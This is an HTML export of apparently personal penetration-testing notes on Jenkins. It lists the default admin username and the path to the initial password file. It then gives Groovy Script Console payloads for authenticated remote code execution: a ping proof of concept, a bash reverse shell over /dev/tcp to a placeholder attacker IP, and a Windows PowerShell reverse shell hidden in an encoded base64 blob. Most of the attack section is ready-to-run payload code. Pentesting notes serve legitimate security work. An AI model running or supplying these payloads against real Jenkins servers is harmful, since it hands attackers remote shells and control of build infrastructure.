<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Jenkins</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Jenkins</h1><br/><p><h1>Background</h1></p><p>Jenkins is typically run as a standalone application in its own process with the built-in <span style="color:#ff0000;">Java</span> servlet container/application server (Jetty).</p><p></p><p>Jenkins can also be run as a servlet in different Java servlet containers such as Apache Tomcat or GlassFish.</p><p></p><p><h2>Default Username</h2></p><p><strong>admin</strong></p><p></p><p>The initial password is auto-generated &amp; located in <strong>$JENKINS_HOME/secrets/initialAdminPassword</strong> (Likely inaccessible). Good chance the initial password has been changed.</p><p></p><p><h1>Authenticated RCE</h1></p><p>See <a href="https://exploit-notes.hdks.org/exploit/web/jenkins-pentesting/">exploit-notes.hdks.org</a> (Idk if the Acct needs elevated privs to get RCE).</p><p></p><p>You can use Java to trigger a payload on the host OS. If the host is Windows, you&#39;ll use a Windows payload.</p><p></p><p>Click <strong>Manage Jenkins</strong> â†’ <strong>Script Console</strong>. Add the Payload in the Console, &amp; click <strong>Run</strong>.</p><p></p><p><h2>Linux</h2></p><p>Can modify the default payload to execute different commands / attempt different reverse shells.</p><p></p><p><h3>PoC</h3></p><p>r = Runtime.getRuntime()</p><p>p = r.exec([&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;ping -c 3 10.2.2.53&quot;] as String[])</p><p>p.waitFor()</p><p></p><p><h3>Default Payload</h3></p><p>r = Runtime.getRuntime()</p><p>p = r.exec([&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;exec 5&lt;&gt;/dev/tcp/&lt;Attacker_IP&gt;/4444; cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</p><p>p.waitFor()</p><p></p><p><h2>Windows</h2></p><p>r = Runtime.getRuntime()</p><p>p = r.exec([&quot;powershell.exe&quot;, &quot;-enc&quot;, &quot;JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADEANAAwACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&quot;] as String[])</p><p>p.waitFor()</p></div>
</body>
</html>
